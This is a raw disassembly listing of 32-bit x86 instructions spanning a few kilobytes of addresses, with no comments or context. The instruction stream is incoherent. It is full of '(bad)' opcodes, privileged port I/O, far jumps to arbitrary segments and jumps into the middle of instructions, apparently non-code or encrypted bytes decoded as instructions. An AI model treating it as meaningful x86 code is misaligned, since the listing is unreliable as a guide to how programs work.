  40c1d1:	imul   ebx,DWORD PTR [ecx-0x57c6ca93],0x3adb6dc0
  40c1db:	and    DWORD PTR [ebx],edi
  40c1dd:	push   eax
  40c1de:	jne    0x40c239
  40c1e0:	mov    esi,0x6dbe3e7d
  40c1e5:	add    eax,0xcd1f342e
  40c1ea:	cmp    al,al
  40c1ec:	adc    eax,0x37d9ad9c
  40c1f1:	call   0xda9ceff8
  40c1f6:	icebp  
  40c1f7:	or     al,0x35
  40c1f9:	ds xchg ebx,eax
  40c1fb:	cmp    DWORD PTR [ebx-0x73],ebx
  40c1fe:	sub    BYTE PTR [ebp-0x7a],ch
  40c201:	aas    
  40c202:	jecxz  0x40c1d2
  40c204:	jbe    0x40c24c
  40c206:	lea    eax,[ebp-0x16f0fd25]
  40c20c:	xchg   ch,dh
  40c20e:	shr    DWORD PTR [eax+esi*8-0x2f47a410],1
  40c215:	outs   dx,BYTE PTR ds:[esi]
  40c216:	dec    dl
  40c218:	cmc    
  40c219:	push   ebx
  40c21a:	cmp    eax,0x704cf6a9
  40c21f:	mov    DWORD PTR [edi-0x769df14a],esi
  40c225:	iret   
  40c226:	fldenv [eax]
  40c228:	in     eax,0xf4
  40c22a:	les    ebp,FWORD PTR [edx+ebx*8]
  40c22d:	pop    edx
  40c22e:	fimul  DWORD PTR [edx]
  40c230:	mov    eax,0x841a1cec
  40c235:	adc    dl,0xb6
  40c238:	pop    ebp
  40c239:	pop    eax
  40c23a:	fdiv   DWORD PTR [esi-0x67]
  40c23d:	push   edx
  40c23e:	cmp    DWORD PTR [ebx+0x18f2d7bc],0x65
  40c245:	mov    bh,0x85
  40c247:	test   DWORD PTR [ebp+0x5f316022],eax
  40c24d:	jmp    0x40c242
  40c24f:	pop    edi
  40c250:	enter  0xdbad,0x42
  40c254:	or     ebp,DWORD PTR [eax+0x38]
  40c257:	jne    0x40c20e
  40c259:	mov    edi,0x70ad97aa
  40c25e:	imul   eax,DWORD PTR [ecx],0xffffffea
  40c261:	push   cs
  40c262:	mov    eax,ds:0x535c2287
  40c267:	aaa    
  40c268:	mov    dh,0xb6
  40c26a:	pop    es
  40c26b:	adc    DWORD PTR [eax+0x251e412e],esp
  40c271:	leave  
  40c272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c273:	sar    DWORD PTR [eax-0x3d53246b],1
  40c279:	inc    edi
  40c27a:	xchg   esp,eax
  40c27b:	push   cs
  40c27c:	std    
  40c27d:	enter  0x2806,0xb5
  40c281:	push   es
  40c282:	mov    cl,0x9c
  40c284:	mov    ds:0xb69da7f6,eax
  40c289:	ins    DWORD PTR es:[edi],dx
  40c28a:	ins    BYTE PTR es:[edi],dx
  40c28b:	adc    eax,0x4e4be27b
  40c290:	and    ebx,DWORD PTR [eax-0x4ab4e597]
  40c296:	dec    ebx
  40c297:	fucomi st,st(0)
  40c299:	or     dh,dl
  40c29b:	imul   ecx,DWORD PTR ds:[edx],0x5
  40c29f:	dec    ebx
  40c2a0:	push   DWORD PTR [ebp+eax*4+0x30040b1b]
  40c2a7:	mov    bh,0x31
  40c2a9:	sbb    al,0x79
  40c2ab:	pusha  
  40c2ac:	mov    esp,0x2c6ed6ed
  40c2b1:	les    edx,FWORD PTR [esi+0x3c]
  40c2b4:	fnsave [esi+0x7b822392]
  40c2ba:	sbb    ch,BYTE PTR [ebp-0x64b4eb56]
  40c2c0:	mov    cs,WORD PTR ds:0x5c25c22c
  40c2c6:	mov    ch,0x6f
  40c2c8:	dec    edx
  40c2c9:	xor    bl,BYTE PTR [ecx]
  40c2cb:	loopne 0x40c30a
  40c2cd:	mov    eax,0xc2b76b6d
  40c2d2:	addr16 dec edi
  40c2d4:	sub    ebx,edx
  40c2d6:	pop    eax
  40c2d7:	jge    0x40c317
  40c2d9:	sbb    eax,0x535bb44
  40c2de:	fistp  DWORD PTR [ecx-0x4]
  40c2e1:	pop    ecx
  40c2e2:	push   0x991a728d
  40c2e7:	cs ds cs xchg esp,eax
  40c2eb:	jg     0x40c34f
  40c2ed:	pop    eax
  40c2ee:	ins    DWORD PTR es:[edi],dx
  40c2ef:	mov    ah,0x47
  40c2f1:	add    BYTE PTR [eax+ecx*4+0x76],ch
  40c2f5:	xchg   esp,eax
  40c2f6:	dec    ebx
  40c2f7:	pop    ebp
  40c2f8:	jmp    0x343d:0x4df71608
  40c2ff:	pop    edi
  40c300:	mov    al,0x92
  40c302:	push   esp
  40c303:	fcmovnbe st,st(6)
  40c305:	mov    dh,0xd7
  40c307:	ror    BYTE PTR [ebx+esi*8+0x62d79761],1
  40c30e:	adc    eax,0x8cd6ea0e
  40c313:	adc    BYTE PTR [ebx-0x2],0x9e
  40c317:	cmp    esp,esi
  40c319:	lea    esi,[esi]
  40c31b:	cs ins DWORD PTR es:[edi],dx
  40c31d:	mov    dh,0xf2
  40c31f:	cmp    DWORD PTR [ecx+0x28007a19],edx
  40c325:	repnz in eax,dx
  40c327:	mov    dh,0xb5
  40c329:	push   ss
  40c32a:	xlat   BYTE PTR ds:[ebx]
  40c32b:	sbb    eax,0x55181712
  40c330:	add    dh,dl
  40c332:	add    BYTE PTR [eax],bh
  40c334:	rcl    BYTE PTR ds:0xa0cb2f96,0x7d
  40c33b:	rol    BYTE PTR [eax],cl
  40c33d:	sbb    BYTE PTR [eax+0x74510d9a],dh
  40c343:	mov    ah,0xb0
  40c345:	aam    0xe3
  40c347:	cs mov bh,0x6a
  40c34a:	xor    al,0xed
  40c34c:	push   edx
  40c34d:	pop    ebx
  40c34e:	ficomp DWORD PTR [ebx+0x410202c9]
  40c354:	outs   dx,BYTE PTR ds:[esi]
  40c355:	sbb    esp,0x5e
  40c358:	sub    DWORD PTR [ebp+0x69],0xffffffa9
  40c35c:	push   esp
  40c35d:	jge    0x40c2f4
  40c35f:	dec    edx
  40c360:	mov    al,0x1b
  40c362:	mov    DWORD PTR [ebx+0x1],ebx
  40c365:	push   0x2220d6b7
  40c36a:	lds    edi,FWORD PTR [ecx-0x261a731f]
  40c370:	mov    eax,0x1acb6d6d
  40c375:	cmp    BYTE PTR [edx+0x3f4ac2d4],0x5e
  40c37c:	mov    cl,0xed
  40c37e:	mov    BYTE PTR [ebp-0x5e],ch
  40c381:	out    dx,eax
  40c382:	aas    
  40c383:	in     al,dx
  40c384:	retf   0x4af0
  40c387:	dec    esp
  40c388:	inc    esp
  40c389:	adc    al,0x2e
  40c38b:	cmp    al,0x6a
  40c38d:	in     al,dx
  40c38e:	mov    esi,DWORD PTR [edx-0x7224d1ca]
  40c394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c395:	lods   eax,DWORD PTR ds:[esi]
  40c396:	push   0xab23bf14
  40c39b:	adc    eax,0x761dbb04
  40c3a0:	sbb    ebx,DWORD PTR [edi]
  40c3a2:	pop    ebx
  40c3a3:	or     ebp,DWORD PTR [esi]
  40c3a5:	cmp    DWORD PTR [edx],0xfbe2ac8
  40c3ab:	ss sub eax,0x24808e45
  40c3b1:	(bad)  
  40c3b2:	mov    esp,0xd70da523
  40c3b7:	mov    dh,0x35
  40c3b9:	jge    0x40c3cc
  40c3bb:	push   ds
  40c3bc:	xchg   ecx,eax
  40c3bd:	repz loope 0x40c3be
  40c3c0:	inc    esi
  40c3c1:	(bad)  [edx-0x795bd35b]
  40c3c7:	and    BYTE PTR [esi],0xb3
  40c3ca:	arpl   sp,ax
  40c3cc:	ret    0xc2c2
  40c3cf:	in     al,0x2e
  40c3d1:	mov    DWORD PTR [edx-0x56a5e960],0xd0d4a170
  40c3db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3dc:	jge    0x40c3f7
  40c3de:	lods   eax,DWORD PTR ds:[esi]
  40c3df:	mov    ecx,0xb69656a3
  40c3e4:	fisubr DWORD PTR [ebp+0x1d]
  40c3e7:	inc    esp
  40c3e8:	fiadd  WORD PTR [ebx+0x170d582c]
  40c3ee:	daa    
  40c3ef:	pusha  
  40c3f0:	fist   DWORD PTR [esi+0x350f0296]
  40c3f6:	out    0xb3,eax
  40c3f8:	(bad)  
  40c3f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3fa:	push   edi
  40c3fb:	test   al,0xb6
  40c3fd:	xor    eax,0x3505bd35
  40c402:	and    BYTE PTR [ebx+0x40a1617d],0xb4
  40c409:	xchg   DWORD PTR [esi-0x24],ebx
  40c40c:	es xchg ecx,eax
  40c40e:	and    eax,0x8c9b956e
  40c413:	push   eax
  40c414:	push   ebp
  40c415:	jae    0x40c45b
  40c417:	pop    es
  40c418:	push   ss
  40c419:	pop    eax
  40c41a:	sub    BYTE PTR [esp+esi*4],al
  40c41d:	push   ss
  40c41e:	push   esi
  40c41f:	ret    
  40c420:	mov    ds:0xb6da38f4,eax
  40c425:	fst    QWORD PTR [esi+0x18bc0a65]
  40c42b:	inc    edi
  40c42c:	aaa    
  40c42d:	outs   dx,BYTE PTR ds:[esi]
  40c42e:	imul   ebp,DWORD PTR [edi],0x51bb42d
  40c434:	mov    WORD PTR [ebp+0xbb101d1],?
  40c43a:	mov    cl,0x10
  40c43c:	add    bl,bl
  40c43e:	lea    esi,[esi]
  40c440:	xchg   esi,eax
  40c441:	mov    ds:0x10904b78,al
  40c446:	fs dec esi
  40c448:	jmp    0x196cf22c
  40c44d:	push   0xffffffc2
  40c44f:	and    BYTE PTR [eax+ebp*1+0x5b1bd53d],ah
  40c456:	mov    ebx,0xef2602b4
  40c45b:	pop    esp
  40c45c:	mov    al,0x74
  40c45e:	and    BYTE PTR [ecx-0x15a36d1c],cl
  40c464:	sub    ch,BYTE PTR [esi+0x5]
  40c467:	sub    BYTE PTR [edi],cl
  40c469:	test   al,0x5c
  40c46b:	cmc    
  40c46c:	popa   
  40c46d:	jecxz  0x40c47d
  40c46f:	push   0xf1546c53
  40c474:	loop   0x40c4b7
  40c476:	scas   al,BYTE PTR es:[edi]
  40c477:	fcomp  QWORD PTR [eax+ebx*2-0x26]
  40c47b:	ficom  DWORD PTR [edi-0x29]
  40c47e:	aam    0xb6
  40c480:	inc    ebp
  40c481:	out    dx,eax
  40c482:	inc    edx
  40c483:	mov    ecx,DWORD PTR [ebx]
  40c485:	sub    BYTE PTR [ebx-0x25],0xad
  40c489:	sub    eax,0x980bc3d3
  40c48e:	xor    dl,ah
  40c490:	push   cs
  40c491:	cdq    
  40c492:	or     eax,DWORD PTR [ecx+edi*8-0x53]
  40c496:	lea    esi,[edx-0x3e]
  40c499:	mov    ecx,0xcad3a1b4
  40c49e:	xchg   BYTE PTR [eax],al
  40c4a0:	popf   
  40c4a1:	push   edi
  40c4a2:	sbb    ecx,DWORD PTR [ebx]
  40c4a4:	pop    ebx
  40c4a5:	ins    DWORD PTR es:[edi],dx
  40c4a6:	dec    edi
  40c4a7:	dec    ebp
  40c4a8:	int    0x37
  40c4aa:	adc    BYTE PTR [edx],bl
  40c4ac:	lahf   
  40c4ad:	in     eax,0x8a
  40c4af:	or     ebx,DWORD PTR [ebx]
  40c4b1:	or     ecx,DWORD PTR [eax-0x5c27ea7b]
  40c4b7:	icebp  
  40c4b8:	inc    edx
  40c4b9:	mov    esi,0xa06b6174
  40c4be:	test   eax,0x6773bac8
  40c4c3:	(bad)  
  40c4c5:	rol    DWORD PTR [eax],1
  40c4c7:	adc    BYTE PTR cs:[ebp+0xe],ch
  40c4cb:	sbb    dl,BYTE PTR [eax-0x49]
  40c4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4d0:	sahf   
  40c4d1:	pop    ebx
  40c4d2:	mov    ecx,0x7f7d2ed1
  40c4d7:	aad    0x59
  40c4d9:	xor    ebp,DWORD PTR ds:0xe1302f0e
  40c4df:	mov    dh,0xb5
  40c4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e2:	push   es
  40c4e3:	sbb    eax,0x98321d41
  40c4e8:	inc    ecx
  40c4e9:	inc    esp
  40c4ea:	push   ecx
  40c4eb:	push   ss
  40c4ec:	or     ebx,DWORD PTR [ebx-0x1f]
  40c4ef:	inc    esi
  40c4f0:	push   ds
  40c4f1:	sub    dl,BYTE PTR [ebx]
  40c4f3:	xchg   edi,eax
  40c4f4:	loopne 0x40c496
  40c4f6:	pop    ds
  40c4f7:	repnz mov al,ds:0xfd0bb6a1
  40c4fd:	adc    DWORD PTR [ebx+0x35f7f6a7],0x596176c4
  40c507:	mov    cl,0x86
  40c509:	pop    ecx
  40c50a:	xor    DWORD PTR [edx-0x3c],ebp
  40c50d:	ja     0x40c581
  40c50f:	mov    ebx,0x52f83e99
  40c514:	or     eax,0x7a5d65d4
  40c519:	out    0x37,al
  40c51b:	cmp    eax,0x56db5b08
  40c520:	imul   ecx,DWORD PTR [edi+0x3213dc22],0x77
  40c527:	pop    ds
  40c528:	outs   dx,DWORD PTR ds:[esi]
  40c529:	outs   dx,BYTE PTR ds:[esi]
  40c52a:	shr    DWORD PTR [esi+0x4b],1
  40c52d:	cmp    edi,DWORD PTR [ebp+0x2c]
  40c530:	jnp    0x40c4d7
  40c532:	sti    
  40c533:	xor    ecx,DWORD PTR [eax]
  40c535:	xor    ebx,DWORD PTR [eax+ebp*2+0x0]
  40c539:	ss scas al,BYTE PTR es:[edi]
  40c53b:	sbb    eax,0x91433851
  40c540:	dec    ecx
  40c541:	pop    eax
  40c542:	push   0x9770285c
  40c547:	and    esp,esp
  40c549:	and    al,0xdc
  40c54b:	push   cs
  40c54c:	pop    ebx
  40c54d:	adc    ebx,DWORD PTR [ebp+0x5a]
  40c550:	retf   0x1256
  40c553:	jp     0x40c5c9
  40c555:	xchg   DWORD PTR [ecx],edi
  40c557:	push   eax
  40c558:	push   esi
  40c559:	dec    ebx
  40c55a:	mov    es,WORD PTR [esi-0x435d9080]
  40c560:	in     al,0x26
  40c562:	in     eax,dx
  40c563:	aaa    
  40c564:	(bad)  
  40c566:	mov    DWORD PTR [edx-0x5d],edx
  40c569:	adc    al,0x98
  40c56b:	int    0x53
  40c56d:	xchg   ebp,eax
  40c56e:	push   ecx
  40c56f:	out    dx,eax
  40c570:	dec    eax
  40c571:	ins    BYTE PTR es:[edi],dx
  40c572:	xchg   esp,eax
  40c573:	or     ecx,ebx
  40c575:	add    BYTE PTR [edi+0x50f564ae],bh
  40c57b:	mov    cl,0xb2
  40c57d:	mov    ds,WORD PTR [edx-0x2d]
  40c580:	mov    dh,0x40
  40c582:	repnz xchg ecx,eax
  40c584:	sub    al,0x2a
  40c586:	pop    edi
  40c587:	aaa    
  40c588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c589:	and    eax,0x8f9601a2
  40c58e:	loope  0x40c549
  40c590:	cs xor eax,0x54318db6
  40c596:	xor    BYTE PTR [esi-0x12],dl
  40c599:	iret   
  40c59a:	and    DWORD PTR [esi+0x644b1bb0],0x20
  40c5a1:	mov    ah,bh
  40c5a3:	xchg   ebp,eax
  40c5a4:	adc    eax,0xd6ed6dde
  40c5a9:	outs   dx,BYTE PTR ds:[esi]
  40c5aa:	jno    0x40c5bd
  40c5ac:	cmc    
  40c5ad:	pop    edi
  40c5ae:	pop    ss
  40c5af:	dec    esi
  40c5b0:	in     eax,0x89
  40c5b2:	mov    dh,0x4e
  40c5b4:	sbb    ebx,DWORD PTR [ebx]
  40c5b6:	dec    ebx
  40c5b7:	sub    al,0xb
  40c5b9:	push   es
  40c5ba:	cmp    ch,dh
  40c5bc:	or     DWORD PTR [edx],eax
  40c5be:	pop    ebp
  40c5bf:	(bad)  
  40c5c0:	les    eax,FWORD PTR [edx]
  40c5c2:	or     ebx,DWORD PTR [ebx]
  40c5c4:	aas    
  40c5c5:	or     BYTE PTR [ebp+eax*8-0x5e],0x53
  40c5ca:	fild   DWORD PTR [esi]
  40c5cc:	shl    BYTE PTR [esi+0x2a471604],0xde
  40c5d3:	push   cs
  40c5d4:	xor    eax,0xab42eda1
  40c5d9:	push   0xa1ee5a53
  40c5de:	loop   0x40c5d2
  40c5e0:	mov    ch,0x5b
  40c5e2:	mov    ebx,0x83cbec6d
  40c5e7:	cmp    ebx,DWORD PTR [ebx+0x68]
  40c5ea:	pop    ss
  40c5eb:	and    al,0x9
  40c5ed:	mov    ebp,gs
  40c5ef:	ret    0xb6d2
  40c5f2:	push   esi
  40c5f3:	(bad)  
  40c5f4:	lahf   
  40c5f5:	xor    ecx,DWORD PTR [edi-0x16dfefd9]
  40c5fb:	in     al,dx
  40c5fc:	mov    dh,0xa7
  40c5fe:	push   ss
  40c5ff:	outs   dx,BYTE PTR ds:[esi]
  40c600:	mov    dh,0xb3
  40c602:	test   ch,bh
  40c604:	adc    BYTE PTR [esi-0x4861a61a],ch
  40c60a:	pop    ss
  40c60b:	mov    cl,0xdd
  40c60d:	sbb    eax,0x53778e16
  40c612:	and    al,BYTE PTR ds:0xd855262
  40c618:	rcl    BYTE PTR [esi*4+0x36010941],0x14
  40c620:	fcmovnb st,st(2)
  40c622:	xchg   ebx,eax
  40c623:	fidiv  WORD PTR [ecx+ebx*1]
  40c626:	or     dh,cl
  40c628:	adc    eax,0x8ad1a6d8
  40c62d:	xchg   esi,eax
  40c62e:	pop    ss
  40c62f:	test   esi,0xcda2cd00
  40c635:	mov    esi,0x7bb0b1b8
  40c63a:	sti    
  40c63b:	pop    es
  40c63c:	push   ebp
  40c63d:	push   edi
  40c63e:	hlt    
  40c63f:	std    
  40c640:	xchg   ebx,ebp
  40c642:	loopne 0x40c61a
  40c644:	push   ebp
  40c645:	fucom  st(0)
  40c647:	add    eax,0xcb46e67a
  40c64c:	sti    
  40c64d:	enter  0xbb42,0x54
  40c651:	mov    ah,BYTE PTR cs:[ecx-0x44d9c2ee]
  40c658:	or     ebx,DWORD PTR [ebx]
  40c65a:	pop    ebx
  40c65b:	rcr    DWORD PTR [esi],1
  40c65d:	and    BYTE PTR [edx],0xfc
  40c660:	cwde   
  40c661:	loop   0x40c69b
  40c663:	pop    ebx
  40c664:	inc    ebx
  40c665:	ins    DWORD PTR es:[edi],dx
  40c666:	ins    DWORD PTR es:[edi],dx
  40c667:	mov    DWORD PTR [ecx-0x2d],esi
  40c66a:	fld    DWORD PTR [edx-0x4b7285f8]
  40c670:	sub    eax,0xd363002d
  40c675:	pop    esp
  40c676:	and    al,0xbc
  40c678:	data16 sub bh,bh
  40c67b:	test   DWORD PTR [esi+0x166e0580],esi
  40c681:	nop
  40c682:	pop    ss
  40c683:	add    BYTE PTR [esp+edx*1+0x0],cl
  40c687:	aad    0x2
  40c689:	cld    
  40c68a:	inc    edx
  40c68b:	mov    ebx,DWORD PTR [eax+0x49]
  40c68e:	dec    edi
  40c68f:	sbb    al,0xe2
  40c691:	test   DWORD PTR [eax+0x0],0xd01d5edf
  40c698:	lods   eax,DWORD PTR ds:[esi]
  40c699:	mov    cl,0x75
  40c69b:	call   DWORD PTR [ebp-0x448c8af0]
  40c6a1:	lock add DWORD PTR [ebp-0x421a1da5],0x6a
  40c6a9:	leave  
  40c6aa:	sti    
  40c6ab:	add    DWORD PTR [eax],edi
  40c6ad:	or     ecx,DWORD PTR [ebp+0x4def436d]
  40c6b3:	and    BYTE PTR [edx+eax*8+0x0],dh
  40c6b7:	retf   0x6874
  40c6ba:	ins    DWORD PTR es:[edi],dx
  40c6bb:	inc    ecx
  40c6bc:	or     edx,esi
  40c6be:	cdq    
  40c6bf:	retf   
  40c6c0:	clc    
  40c6c1:	cmp    eax,0xdda05a5c
  40c6c6:	js     0x40c68c
  40c6c8:	dec    ebx
  40c6c9:	add    eax,0x5268d1a2
  40c6ce:	repz das 
  40c6d0:	ins    BYTE PTR es:[edi],dx
  40c6d1:	mov    ah,0x3e
  40c6d3:	div    DWORD PTR [ecx-0x65]
  40c6d6:	jbe    0x40c6a7
  40c6d8:	pop    ss
  40c6d9:	mov    ?,WORD PTR [esi]
  40c6db:	jp     0x40c6dd
  40c6dd:	mov    es,WORD PTR [eax+0x62fbca26]
  40c6e3:	shl    DWORD PTR [ebx+0x5f],cl
  40c6e6:	sbb    eax,0xb7a58dd0
  40c6eb:	mov    esp,0xd8263fc7
  40c6f0:	scas   eax,DWORD PTR es:[edi]
  40c6f1:	mov    eax,ds:0x4285c01
  40c6f6:	xlat   BYTE PTR ds:[ebx]
  40c6f7:	sub    BYTE PTR [esi+0x1b],dh
  40c6fa:	rol    edx,cl
  40c6fc:	inc    edx
  40c6fd:	add    ebp,DWORD PTR [eax+0x147e88c]
  40c703:	cmp    ah,BYTE PTR [edi+0x36a8d1b6]
  40c709:	and    edi,DWORD PTR [edi-0x40369f8d]
  40c70f:	sub    esp,DWORD PTR [eax-0x580924fb]
  40c715:	out    0x40,eax
  40c717:	push   DWORD PTR [ebp+edx*2+0x4a5c5bb5]
  40c71e:	inc    ebx
  40c71f:	cmc    
  40c720:	cmp    ebx,DWORD PTR [edi+0x4d6db0bb]
  40c726:	arpl   WORD PTR [edx],bp
  40c728:	add    ch,BYTE PTR [edi]
  40c72a:	inc    ecx
  40c72b:	inc    ebx
  40c72c:	fld    DWORD PTR [edx-0x24]
  40c72f:	jge    0x40c6ec
  40c731:	sub    eax,0x49c55b6d
  40c736:	or     BYTE PTR ds:0x3b92b008,ah
  40c73c:	in     eax,0xe
  40c73e:	lods   eax,DWORD PTR ds:[esi]
  40c73f:	xor    eax,0xa7cc6db6
  40c744:	into   
  40c745:	push   eax
  40c746:	(bad)  
  40c747:	arpl   WORD PTR [esp+edx*2],bp
  40c74a:	stos   DWORD PTR es:[edi],eax
  40c74b:	jo     0x40c7a8
  40c74d:	push   0x294b1f32
  40c752:	sbb    bl,bl
  40c754:	mov    ch,0x3d
  40c756:	je     0x40c6fb
  40c758:	jno    0x40c7bb
  40c75a:	call   0xa8d5:0xab64a31c
  40c761:	test   BYTE PTR [edx],0x97
  40c764:	sub    BYTE PTR [edi],dl
  40c766:	mov    bl,0x19
  40c768:	nop
  40c769:	sub    DWORD PTR [ebx+0x376c1435],ecx
  40c76f:	outs   dx,DWORD PTR ds:[esi]
  40c770:	dec    esi
  40c771:	or     esi,DWORD PTR [ecx+0x11]
  40c774:	xchg   esp,eax
  40c775:	xchg   edx,eax
  40c776:	push   eax
  40c777:	pop    ecx
  40c778:	mov    eax,0x164a62b0
  40c77d:	xchg   BYTE PTR [eax],bh
  40c77f:	jo     0x40c799
  40c781:	ins    DWORD PTR es:[edi],dx
  40c782:	mov    bh,0x16
  40c784:	sbb    ah,BYTE PTR [edi-0x39]
  40c787:	lds    ebp,FWORD PTR [ebx]
  40c789:	(bad)  
  40c78a:	dec    esi
  40c78b:	add    eax,0xb616020c
  40c790:	lods   eax,DWORD PTR ds:[esi]
  40c791:	sub    ecx,ebp
  40c793:	ret    
  40c794:	sub    al,0xd2
  40c796:	fmul   st(2),st
  40c798:	outs   dx,BYTE PTR ds:[esi]
  40c799:	xchg   esp,eax
  40c79a:	sub    eax,0x633ff496
  40c79f:	aas    
  40c7a0:	or     al,0xf9
  40c7a2:	outs   dx,DWORD PTR ds:[esi]
  40c7a3:	fidiv  DWORD PTR [esi-0x5ed92913]
  40c7a9:	clc    
  40c7aa:	imul   esp,eax,0xe9a14761
  40c7b0:	in     eax,dx
  40c7b1:	dec    ebx
  40c7b2:	mov    ah,0x41
  40c7b4:	pop    ebx
  40c7b5:	sahf   
  40c7b6:	out    dx,al
  40c7b7:	ret    0x210e
  40c7ba:	push   esp
  40c7bb:	out    0xd4,eax
  40c7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7be:	test   DWORD PTR [esi],eax
  40c7c0:	mov    bl,0xfd
  40c7c2:	push   0x6b
  40c7c4:	lahf   
  40c7c5:	call   0x4dd4:0x1db6946d
  40c7cc:	sub    BYTE PTR [eax],ah
  40c7ce:	lods   eax,DWORD PTR ds:[esi]
  40c7cf:	push   ebx
  40c7d0:	arpl   WORD PTR [ebx+0x5d],di
  40c7d3:	js     0x40c837
  40c7d5:	mov    ebx,0x17a57ee0
  40c7da:	mov    edx,0x5122146a
  40c7df:	mov    cl,0x60
  40c7e2:	pop    eax
  40c7e3:	sub    bh,BYTE PTR [eax]
  40c7e5:	mov    dh,0x2e
  40c7e7:	pop    eax
  40c7e8:	cs call 0x3747:0x61697685
  40c7f0:	push   edi
  40c7f1:	mov    ecx,0x19c8409d
  40c7f6:	fnsave [esi]
  40c7f8:	fisub  DWORD PTR ss:[ebp-0x4e]
  40c7fc:	retf   
  40c7fd:	mov    ds:0x4d156f1e,al
  40c802:	or     al,0xfb
  40c804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c806:	jbe    0x40c7a9
  40c808:	enter  0xcb85,0x71
  40c80c:	imul   ebp,DWORD PTR [edi],0xffffffed
  40c80f:	push   cs
  40c810:	inc    esi
  40c811:	mov    al,0xf4
  40c813:	aam    0x5b
  40c815:	mov    edx,0xbf849cc
  40c81a:	cmp    cl,BYTE PTR [ebx+ebx*1-0x1b]
  40c81e:	mov    bh,0xb
  40c820:	xor    al,0xaa
  40c822:	add    BYTE PTR [esi-0x7a],bh
  40c825:	push   esp
  40c826:	das    
  40c827:	(bad)  
  40c828:	fcmovu st,st(2)
  40c82a:	lods   eax,DWORD PTR ds:[esi]
  40c82b:	fnsave ds:0x831da8c5
  40c831:	xor    edx,ecx
  40c833:	and    BYTE PTR [ebp+0x27],cl
  40c836:	shr    DWORD PTR [ebp+0x5b],cl
  40c839:	(bad)  
  40c83b:	sub    DWORD PTR [ebx-0x522ddfc3],ebx
  40c841:	and    BYTE PTR [edi+0x16db8d71],dl
  40c847:	in     eax,dx
  40c848:	add    dh,BYTE PTR [eax+0x35193f11]
  40c84e:	es mov ebx,0x8eb7cb00
  40c854:	xor    BYTE PTR [eax+0x62],0x37
  40c858:	and    BYTE PTR [esp+eax*4],cl
  40c85b:	add    BYTE PTR [esi+0x5],ch
  40c85e:	mov    dh,0x5b
  40c860:	lods   eax,DWORD PTR ds:[esi]
  40c861:	dec    ebx
  40c862:	repnz rol BYTE PTR [edi+0x34],0xa3
  40c867:	ds push ebx
  40c869:	pop    ss
  40c86a:	arpl   WORD PTR [ebp+0x2736dbf6],ax
  40c870:	jmp    0xda182e7a
  40c875:	pop    eax
  40c876:	jp     0x40c885
  40c878:	pop    edi
  40c879:	fst    QWORD PTR [esi]
  40c87b:	mov    dh,0xea
  40c87d:	jecxz  0x40c84c
  40c87f:	xchg   edi,eax
  40c880:	shl    edx,cl
  40c882:	xchg   ebp,eax
  40c883:	dec    ebx
  40c884:	mov    dh,0xc7
  40c886:	frstpm(287 only) 
  40c888:	pop    ebx
  40c889:	sbb    edi,DWORD PTR [ecx]
  40c88b:	inc    ebp
  40c88c:	fldenv [esi-0x705fffcc]
  40c892:	dec    esi
  40c893:	sbb    dh,BYTE PTR [esp+esi*4-0x53]
  40c897:	imul   edi,ecx,0x429b00
  40c89d:	mov    ss,edx
  40c89f:	sub    DWORD PTR [ebx-0x5f],ebx
  40c8a2:	jl     0x40c84b
  40c8a4:	mov    ah,0x3
  40c8a6:	mov    edx,0x2ffcf72d
  40c8ab:	loop   0x40c901
  40c8ad:	dec    edi
  40c8ae:	lock jle 0x40c831
  40c8b1:	lea    ebp,[ebp+0x795786a2]
  40c8b7:	lock mov BYTE PTR [esi-0x23d17258],dh
  40c8be:	dec    esi
  40c8bf:	xor    esp,DWORD PTR [edi+eiz*1]
  40c8c2:	mov    ecx,0xdbf0b457
  40c8c7:	xchg   edx,eax
  40c8c8:	sbb    edx,DWORD PTR [ebp+0x660a8a16]
  40c8ce:	popf   
  40c8cf:	ins    DWORD PTR es:[edi],dx
  40c8d0:	pop    ss
  40c8d1:	cmp    ah,BYTE PTR [edx+0x2d]
  40c8d4:	mov    al,ds:0x90ac6a86
  40c8d9:	or     ecx,esi
  40c8db:	push   0x68dda362
  40c8e0:	ror    edi,0x68
  40c8e3:	hlt    
  40c8e4:	add    dh,BYTE PTR [eax]
  40c8e6:	push   ebp
  40c8e7:	mov    edx,0x8a0d0b80
  40c8ec:	call   0xe7cb9043
  40c8f1:	push   eax
  40c8f2:	xchg   ebp,eax
  40c8f3:	outs   dx,DWORD PTR ds:[esi]
  40c8f4:	aaa    
  40c8f5:	ins    BYTE PTR es:[edi],dx
  40c8f6:	popa   
  40c8f7:	test   BYTE PTR [eax+ecx*8],dl
  40c8fa:	add    BYTE PTR [edi-0x17],bh
  40c8fd:	pop    ebx
  40c8fe:	or     ebp,DWORD PTR [esi-0x5f]
  40c901:	stos   BYTE PTR es:[edi],al
  40c902:	jae    0x40c97d
  40c904:	and    ebp,DWORD PTR [ebp+0x62]
  40c907:	mul    esp
  40c909:	add    DWORD PTR [ebx],ecx
  40c90b:	lods   eax,DWORD PTR ds:[esi]
  40c90c:	or     eax,ecx
  40c90e:	or     BYTE PTR ds:0x58abe5ca,ah
  40c914:	pop    eax
  40c915:	pop    eax
  40c916:	sub    BYTE PTR ds:0xa33db9c4,bh
  40c91c:	in     eax,0x8a
  40c91e:	test   DWORD PTR [ebp-0x44f9248a],ecx
  40c924:	pop    ss
  40c925:	popf   
  40c926:	sbb    eax,0x1f890629
  40c92b:	ins    DWORD PTR es:[edi],dx
  40c92c:	arpl   WORD PTR [ecx-0x5d],sp
  40c92f:	xchg   ecx,eax
  40c930:	and    ch,BYTE PTR [ebp+ecx*8-0x37bd0f6e]
  40c937:	(bad)  
  40c938:	outs   dx,BYTE PTR ds:[esi]
  40c939:	test   DWORD PTR [eax-0x5df121a2],eax
  40c93f:	gs fwait
  40c941:	and    ch,bl
  40c943:	cmp    ah,BYTE PTR [edx-0x17]
  40c946:	mov    ah,BYTE PTR [esi]
  40c948:	cmp    BYTE PTR [ebp-0x464ca1a7],0x36
